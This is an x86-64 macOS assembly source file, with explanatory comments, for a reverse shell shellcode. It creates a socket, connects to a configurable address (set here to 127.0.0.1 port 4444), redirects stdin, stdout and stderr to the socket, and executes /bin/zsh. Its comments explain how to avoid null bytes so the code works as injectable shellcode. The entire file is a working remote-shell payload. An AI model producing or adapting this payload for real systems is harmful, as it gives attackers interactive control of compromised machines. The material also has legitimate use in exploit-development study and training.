bits 64
global _main

_main:

	; socket syscall
	; -----------------------------------------------
	; int socket(int domain, int type, int protocol);
	; -----------------------------------------------

	push 0x2
	pop rdi						; RDI = AF_INET = 2
	push 0x1
	pop rsi						; RSI = SOCK_STREAM = 1
	xor rdx, rdx					; RDX = IPPROTO_IP = 0

	; execute socket syscall (#97)

	push 0x61					; 0x61 = 97 (socket syscall) -> To the stack 
	pop rax
	bts rax, 25					; set 25th bit to 1 -> avoid null bytes
	syscall 					; execute socket
	mov r9, rax 					; store the returned file descriptor in r9

	; connect syscall
	; ----------------------------------------------------
	; int connect(int s, caddr_t name, socklen_t namelen);
	; ----------------------------------------------------

	mov rdi, r9					; put the saved fd into RDI

	; Build the structure - Set IP & Port Here!

	xor rsi, rsi 					; zero out RSI
	mov rsi, 0x0100007f5c110200 ; IP = 127.0.0.1 (7f000001), Port = 4444 (115c), AF_INET = 2 (02), Len = 0 (00)

	; In the above instruction we will have null bytes, although theres a few things we can do
	; 1) mov rsi, 0x0100007f
	; 2) push rsi
	; 3) mov esi, 0x5c110201
	; 4) dec esi
	; This will remove the null byte from the Len paramater (00), however, will not fix the null bytes in the IP (127.0.0.1 -> 01 00 00 7f)

	push rsi 					; push RSI (0x0100007f5c110200) to the stack
	push rsp
	pop rsi 					; RSI = RSP = pointer to the struct
	push 0x10
	pop rdx 					; RDX = 0x10 = length of the struct
	
	; execute connect syscall (#98)

	push 0x62 					; put 98 on the stack
	pop rax 					; pop to the RAX
	bts rax, 25 					; set 25th bit to 1 -> avoid null bytes
	syscall 					; execute connect
	
	; dup2 function call
	; -----------------------------------------------------------
	; dup2(int fildes, int fildes2)
	; fildes = existing file descriptor, fildes2 = STD IN/OUT/ERR 
	; -----------------------------------------------------------

	mov rdi, r9 					; put the file descriptor previously stored in r9 into RDI
	push 2
	pop rsi 					; set RSI to 2
	
	; loop to set up stdin, stdout, and stderr

	dup2_loop:
	push 0x5a 					; put 90 on the stack (dup2)
	pop rax 					; pop to RAX
	bts rax, 25 					; set 25th bit to 1 -> avoid null bytes
	syscall 					; execute dup2
	dec rsi 					; decrement RSI
	jns dup2_loop 					; repeat the loop if RSI >= 0

	; execve syscall
	; --------------------------------------------------
	; int execve(char *fname, char **argp, char **envp);
	; --------------------------------------------------
	
	xor rdx, rdx  					; zero RDX
	push rdx 					; NULL string terminator
	mov rbx, '/bin/zsh' 				; push string into RBX (/bin/zsh is default on mac)
	push rbx 					; push string to the stack
	mov rdi, rsp 					; store the stack pointer in RDI
	push rdx 					; argv[1] = 0
	push rdi 					; argv[0] = /bin/zsh
	mov rsi, rsp 					; store RSP in RSI

	; execute execve syscall (#59)

	push 59 					; put 59 on the stack
	pop rax 					; pop it
	bts rax, 25 					; set 25th bit in RAX to 1 -> avoid null bytes
	syscall 					; execute execve
